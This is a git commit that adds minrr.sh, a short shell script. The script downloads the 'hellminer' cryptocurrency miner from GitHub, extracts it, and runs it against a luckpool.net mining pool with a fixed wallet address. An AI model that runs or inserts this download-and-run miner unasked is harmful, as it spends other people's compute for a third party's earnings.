5c95384f645cabeafa0356e0aad832fed74870b1
apaple <76417012+apaple@users.noreply.github.com>
2024-08-20 06:24:59 +0700

    Create minrr.sh

---
+++ minrr.sh
@@ -0,0 +1,6 @@
+
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+
+tar xf hellminer_linux64.tar.gz
+
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.wrke -p x --cpu 8
